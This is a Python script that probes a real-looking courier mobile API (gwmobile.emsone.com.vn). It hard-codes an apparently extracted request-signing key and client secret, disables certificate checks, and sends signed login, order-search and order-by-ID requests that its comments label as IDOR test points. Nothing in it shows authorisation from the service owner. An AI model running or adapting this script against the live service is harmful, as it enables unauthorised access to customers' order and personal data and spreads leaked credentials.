#!/usr/bin/env python3
"""
EMS ONE API 测试工具
发现：gwmobile.emsone.com.vn
签名密钥：Ems@2021
"""

import requests
import json
import hashlib
import urllib3
urllib3.disable_warnings()

BASE_URL = "https://gwmobile.emsone.com.vn"
SIGN_KEY = "Ems@2021"

def sha256_sign(data):
    """
    签名算法：SHA256(data + "Ems@2021")
    """
    sign_str = data + SIGN_KEY
    return hashlib.sha256(sign_str.encode('utf-8')).hexdigest()

def create_request(code, data_obj):
    """
    构造EmsDataRequest
    """
    data_str = json.dumps(data_obj, ensure_ascii=False, separators=(',', ':'))
    
    request = {
        "channel": "ANDROID",
        "code": code,
        "data": data_str,
        "signature": sha256_sign(data_str)
    }
    
    return request

def call_api(code, data_obj, token=None):
    """
    调用EMS ONE API
    """
    request_body = create_request(code, data_obj)
    
    # 构造Headers（关键！）
    headers = {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'DeviceName': 'ANDROID',
        'Content-Type': 'application/json',
    }
    
    if token:
        headers['Authorization'] = f'Bearer {token}'
    
    print(f"\n{'='*60}")
    print(f"[API调用] Code: {code}")
    print(f"{'='*60}")
    print(f"Headers: {headers}")
    print(f"Data: {request_body['data']}")
    print(f"Signature: {request_body['signature']}")
    
    try:
        r = requests.post(
            f"{BASE_URL}/execute",
            json=request_body,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        print(f"\n[响应] HTTP {r.status_code}")
        print(f"Content-Type: {r.headers.get('Content-Type')}")
        
        try:
            resp_json = r.json()
            print(f"\n{json.dumps(resp_json, indent=2, ensure_ascii=False)}")
            return resp_json
        except:
            print(f"\n{r.text[:500]}")
            return None
        
    except Exception as e:
        print(f"\n[!] 错误: {e}")
        return None

# ===================================================================
# 测试用例
# ===================================================================

print("="*70)
print(" EMS ONE API 测试 - gwmobile.emsone.com.vn")
print("="*70)

# 1. 测试登录
print("\n\n[测试 1] EMPLOYEE_LOGIN_V2 - 员工登录")
call_api("EMPLOYEE_LOGIN_V2", {
    "phone": "0123456789",
    "password": "test123"
})

# 2. 测试运单号查询（IDOR漏洞测试点！）
print("\n\n[测试 2] ORDER_GET_BY_SHIPPING_CODE - 运单号查询")
call_api("ORDER_GET_BY_SHIPPING_CODE", {
    "shippingCode": "EMS000001"
})

# 3. 测试通过ID获取订单（IDOR漏洞测试点！）
print("\n\n[测试 3] ORDER_GET_BY_ID - ID查询订单")
call_api("ORDER_GET_BY_ID", {
    "orderId": "1"
})

# 4. 测试订单搜索
print("\n\n[测试 4] ORDER_SEARCH - 订单搜索")
call_api("ORDER_SEARCH", {
    "keyword": "EMS"
})

# 5. 测试空数据（看返回的错误信息）
print("\n\n[测试 5] ORDER_GET_BY_SHIPPING_CODE - 空参数")
call_api("ORDER_GET_BY_SHIPPING_CODE", {})

print("\n\n" + "="*70)
print(" 测试完成！")
print("="*70)
